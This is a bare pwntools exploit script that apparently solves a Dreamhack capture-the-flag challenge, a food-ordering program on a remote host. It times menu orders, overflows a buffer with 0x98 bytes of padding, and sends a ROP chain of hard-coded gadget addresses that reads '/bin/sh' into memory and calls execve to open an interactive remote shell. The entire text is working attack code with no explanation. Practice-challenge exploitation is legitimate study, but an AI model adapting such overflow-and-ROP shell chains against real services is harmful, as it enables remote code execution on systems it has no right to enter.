from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23787
r = remote(HOST, PORT)

def order(food):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'? ', food)

def view():
    r.sendlineafter(b'> ', b'2')

def exit(review):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'? ', review)
foods = [b'Soondae-gukbap', b'Butadon', b'Donkatsu-set', b'Jajangmyun', b'Jjamppong', b'Kalguksu', b'Ramen']

order(foods[0])
r.recvuntil(b'\'Soondae-gukbap\'...')
t0 = time.monotonic()
time.sleep(max(0, 1.818 - (time.monotonic() - t0)))
order(foods[3])
time.sleep(max(0, 3.5 - (time.monotonic() - t0)))

pop_rax = 0x45dc17
pop_rdi = 0x404dbe
pop_rsi = 0x41b6b9
pop_rdx_rbx = 0x4aad8b
syscall = 0x4a1bd9
bss = 0x4ff200+0x100
ret = 0x401caa

payload = flat([
    pop_rax, 0,
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx_rbx, 0x8,0,
    syscall,

    pop_rax, 59,
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rdx_rbx, 0, 0,
    syscall
])
r.sendline(b'3')
r.sendlineafter(b'? ', b'A'*0x98 + payload)
r.recvuntil(b'review.')
r.send(b'/bin/sh\x00')
r.interactive()